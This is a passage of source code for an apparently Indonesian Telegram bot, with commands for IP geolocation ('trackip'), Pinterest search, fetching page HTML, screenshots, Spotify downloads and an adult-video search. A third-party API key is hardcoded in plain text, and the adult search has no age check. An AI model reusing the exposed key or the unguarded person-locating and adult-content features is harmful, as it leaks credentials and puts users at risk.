      caption: "✅ SsIphone By Fluxxo Created ★",
      parse_mode: "Markdown"
    });
  } catch (err) {
    console.error("ERROR callback_query:", err.message);
    bot.sendMessage(chatId, "Gagal generate IQC.");
  }
});

// ========= \ DARK - PEMBATAS / =========\\
async function trackIP(msg, args) {
    const chatId = msg.chat.id;

    if (args.length < 1) {
        const message = `Contoh: \`/trackip <ip address>\`\n/trackip 1.1.1.1`;
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' }); 
        sigma();
        return;
    }

    const [target] = args;

    if (target === '0.0.0.0') {
        bot.sendMessage(chatId, 'Jangan Di Ulangi Manis Nanti Di Delete User Mu');
        sigma();
        return;
    }

    try {
        const apiKey = '8fd0a436e74f44a7a3f94edcdd71c696'; 
        const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${target}`);
        const res = await fetch(`https://ipwho.is/${target}`);

        if (!response.ok || !res.ok) {
            throw new Error(`Gagal mengambil data IP. Status: ${response.status} or ${res.status}`);
        }

        const additionalInfo = await res.json();
        const ipInfo = await response.json();

        
        if (!ipInfo || typeof ipInfo !== 'object' || Object.keys(ipInfo).length === 0) {
             throw new Error('Data dari api.ipgeolocation.io tidak valid.');
        }
        if (!additionalInfo || typeof additionalInfo !== 'object' || Object.keys(additionalInfo).length === 0) {
            throw new Error('Data dari ipwho.is tidak valid');
        }

        const message = `Informasi IP untuk ${target}:\n` +
            `- Flags: ${ipInfo.country_flag || 'N/A'}\n` + 
           `- Country: ${ipInfo.country_name || 'N/A'}\n` +
            `- Capital: ${ipInfo.country_capital || 'N/A'}\n` +
            `- City: ${ipInfo.city || 'N/A'}\n` +
           `- ISP: ${ipInfo.isp || 'N/A'}\n` +
            `- Organization: ${ipInfo.organization || 'N/A'}\n` +
            `- Latitude: ${ipInfo.latitude || 'N/A'}\n` +
            `- Longitude: ${ipInfo.longitude || 'N/A'}\n\n` +
            `Google Maps: https://www.google.com/maps/place/${additionalInfo.latitude || ''}+${additionalInfo.longitude || ''}`;


        bot.sendMessage(chatId, message);
        
    } catch (error) {
        console.error(`Error melacak ${target}:`, error);
        bot.sendMessage(chatId, `Error melacak ${target}.  Silakan coba lagi nanti.  Error: ${error.message}`);  
        sigma();
    }
}

// ========= \ DARK - PEMBATAS / =========\\
bot.onText(/\/trackip (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const senderId = msg.from.id;
    const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return; ;
    const args = match[1].split(' ');

    trackIP(msg, args);
    bot.sendMessage(chatId, 'Bot siap digunakan.  Ketik /trackip <ip address> untuk melacak IP.');
});

// ========= \ DARK - PEMBATAS / =========\\
bot.onText(/^\/pinsearch(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  if (!query) {
    return bot.sendMessage(chatId, "❌ Format salah!\nContoh:\n`/pin anime`", {
      parse_mode: "Markdown",
      reply_to_message_id: msg.message_id
    });
  }

  const url = `https://api.nekolabs.my.id/discovery/pinterest/search?q=${encodeURIComponent(query)}`;
  let wait;

  try {
    await bot.sendChatAction(chatId, "upload_photo");
    wait = await bot.sendMessage(chatId, "🔎", {
      reply_to_message_id: msg.message_id
    });

    const res = await fetch(url);
    if (!res.ok) throw new Error(`HTTP ${res.status}`);

    const data = await res.json();
    if (!data.success || !Array.isArray(data.result) || data.result.length === 0)
      throw new Error("Tidak ditemukan hasil.");

    const results = data.result.slice(0, 5);
    const index = 0;
    const item = results[index];

    const caption = item.caption || "(tidak ada deskripsi)";
    const author = item.author?.fullname || "Anonim";
    const followers = item.author?.followers ?? 0;
    const pinUrl = item.url || "https://www.pinterest.com";

    const inlineKeyboard = {
      inline_keyboard: [
        [
          { text: "<<", callback_data: `pin_prev|${chatId}|${index}` },
          { text: `${index + 1}/${results.length}`, callback_data: "noop" },
          { text: ">>", callback_data: `pin_next|${chatId}|${index}` }
        ]
      ]
    };

    const sent = await bot.sendPhoto(chatId, item.imageUrl, {
      parse_mode: "Markdown",
      reply_markup: inlineKeyboard,
      reply_to_message_id: msg.message_id
    });

    await bot.deleteMessage(chatId, wait.message_id);

    // Simpan data hasil pencarian ke memori sementara
    global.pinData = global.pinData || {};
    global.pinData[sent.message_id] = { results, index };

  } catch (err) {
    console.error("❌ Error Pinterest:", err.message);
    const errMsg =
      err.message.includes("Tidak ditemukan")
        ? "❌ Tidak ada hasil ditemukan untuk pencarian itu."
        : err.message.includes("fetch")
        ? "🌐 Tidak bisa terhubung ke server Pinterest."
        : "⚠️ Terjadi kesalahan, coba lagi nanti.";

    if (wait) {
      try {
        await bot.editMessageText(errMsg, {
          chat_id: chatId,
          message_id: wait.message_id
        });
      } catch {
        await bot.sendMessage(chatId, errMsg, {
          reply_to_message_id: msg.message_id
        });
      }
    } else {
      await bot.sendMessage(chatId, errMsg, {
        reply_to_message_id: msg.message_id
      });
    }
  }
});

// ========= \ DARK - PEMBATAS / =========\\
bot.on("callback_query", async (q) => {
  try {
    if (!q.data.startsWith("pin_")) return;

    const [action, chatId, idxStr] = q.data.split("|");
    const messageId = q.message.message_id;

    const data = global.pinData?.[messageId];
    if (!data) return bot.answerCallbackQuery(q.id, { text: "⚠️ Data sudah kadaluarsa." });

    let index = parseInt(idxStr);
    if (action === "pin_next") index = (index + 1) % data.results.length;
    if (action === "pin_prev") index = (index - 1 + data.results.length) % data.results.length;

    const item = data.results[index];
    const caption = item.caption || "(tidak ada deskripsi)";
    const author = item.author?.fullname || "Anonim";
    const followers = item.author?.followers ?? 0;
    const pinUrl = item.url || "https://www.pinterest.com";

    const inlineKeyboard = {
      inline_keyboard: [
        [
          { text: "<<", callback_data: `pin_prev|${chatId}|${index}` },
          { text: `${index + 1}/${data.results.length}`, callback_data: "noop" },
          { text: ">>", callback_data: `pin_next|${chatId}|${index}` }
        ]
      ]
    };

    await bot.editMessageMedia(
      {
        type: "photo",
        media: item.imageUrl,
        parse_mode: "Markdown"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: inlineKeyboard
      }
    );

    data.index = index;
    bot.answerCallbackQuery(q.id);
  } catch (err) {
    console.error("❌ Callback Error:", err.message);
    bot.answerCallbackQuery(q.id, { text: "⚠️ Gagal memuat gambar." });
  }
});

// ========= \ DARK - PEMBATAS / =========\\
bot.onText(/\/getcode (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const userId = msg.from.id;

  const url = (match[1] || "").trim();
  if (!/^https?:\/\//i.test(url)) {
    return bot.sendMessage(chatId, "example: /getcode https://namaweb");
  }

  try {
    const response = await axios.get(url, {
      responseType: "text",
      headers: { "User-Agent": "Mozilla/5.0 (compatible; Bot/1.0)" },
      timeout: 20000
    });
    const htmlContent = response.data;

    const filePath = path.join(__dirname, "web_source.html");
    fs.writeFileSync(filePath, htmlContent, "utf-8");

    await bot.sendDocument(chatId, filePath, {
      caption: `✅ CODE DARI ${url}`
    });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "ERROR SAAT MENGAMBIL CODE WEB");
  }
});

// ========= \ DARK - PEMBATAS / =========\\
bot.onText(/^\/xnxx(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  if (!query) {
    return bot.sendMessage(chatId, '🔍 Contoh penggunaan:\n/xnxx jepang');
  }

  try {
    const res = await axios.get('https://www.ikyiizyy.my.id/search/xnxx', {
      params: {
        apikey: 'new',
        q: query
      }
    });

    const results = res.data.result;

    if (!results || results.length === 0) {
      return bot.sendMessage(chatId, `❌ Tidak ditemukan hasil untuk: *${query}*`, { parse_mode: 'Markdown' });
    }

    const text = results.slice(0, 3).map((v, i) => (
      `📹 *${v.title}*\n🕒 Durasi: ${v.duration}\n🔗 [Tonton Sekarang](${v.link})`
    )).join('\n\n');

    bot.sendMessage(chatId, `🔞 Hasil untuk: *${query}*\n\n${text}`, {
      parse_mode: 'Markdown',
      disable_web_page_preview: true
    });

  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, '❌ Terjadi kesalahan saat mengambil data.');
  }
});

// ========= \ DARK - PEMBATAS / =========\\
bot.onText(/^\/ssweb (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const text = match[1];

    if (!text || !text.trim()) {
        return bot.sendMessage(chatId, "Contoh:\n/ssweb google.com");
    }

    try {
        bot.sendChatAction(chatId, "upload_photo").catch(() => {});

        let cleanUrl = text.replace(/^https?:\/\//, "").trim();
        let finalUrl = "https://" + cleanUrl;

        let ssImage = "https://image.thum.io/get/width/1900/crop/1000/fullpage/" + finalUrl;

        await bot.sendPhoto(chatId, ssImage, {
            caption: "_berhasil ssweb_",
            parse_mode: "Markdown"
        });

    } catch (e) {
        console.log("SSWEB ERROR:", e);
        bot.sendMessage(chatId, "⚠️ Server SS Web sedang offline atau URL tidak valid.");
    }
});

bot.onText(/^\/spotify (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  let wait;
  try {
    // Pesan tunggu
    wait = await bot.sendMessage(chatId, "⏳", {
      reply_to_message_id: msg.message_id
    });

    // Fetch dari API
    const apiUrl = `https://api.nekolabs.my.id/downloader/spotify/play/v1?q=${encodeURIComponent(query)}`;
    const res = await fetch(apiUrl);
    const data = await res.json();

    if (!data.success || !data.result?.downloadUrl) {
      return bot.editMessageText("❌ Lagu tidak ditemukan atau link tidak valid!", {
        chat_id: chatId,
        message_id: wait.message_id
      });
    }

    const info = data.result.metadata;
    const audioUrl = data.result.downloadUrl;

    if (!audioUrl.startsWith("http")) {
      return bot.editMessageText("⚠️ URL audio tidak valid, coba judul lain!", {
        chat_id: chatId,
        message_id: wait.message_id
      });
    }

    // Buat folder download kalau belum ada
    const downloadDir = path.join(process.cwd(), "downloads");
    if (!fs.existsSync(downloadDir)) fs.mkdirSync(downloadDir);

    // Nama file
    const fileName = `${info.title.replace(/[\/\\:*?"<>|]/g, "_")}.mp3`;
    const filePath = path.join(downloadDir, fileName);

    // Download audio dan simpan ke file lokal
    const fileRes = await fetch(audioUrl);
    if (!fileRes.ok) throw new Error("Gagal mengunduh audio");
    const buffer = Buffer.from(await fileRes.arrayBuffer());
    fs.writeFileSync(filePath, buffer);

    // Kirim ke user
    await bot.sendAudio(chatId, fs.createReadStream(filePath), {
      title: info.title,
      performer: info.artist,
      thumb: info.cover,
      caption: `🎵 *${info.title}* - ${info.artist}\n🕒 ${info.duration}\n🔗 [Spotify Link](${info.url})`,
      parse_mode: "Markdown",
      reply_to_message_id: msg.message_id
    });

    // Hapus file setelah dikirim
    fs.unlinkSync(filePath);

    await bot.deleteMessage(chatId, wait.message_id);
  } catch (err) {
    console.error("Error Spotify:", err);
    const errMsg = err.message.includes("fetch")
      ? "🌐 Gagal terhubung ke server Spotify."
      : "⚠️ Terjadi kesalahan saat memutar lagu.";

    if (wait) {
      await bot.editMessageText(errMsg, {
        chat_id: chatId,
        message_id: wait.message_id
      });
    } else {
      await bot.sendMessage(chatId, errMsg, {
        reply_to_message_id: msg.message_id
      });
    }
  }
});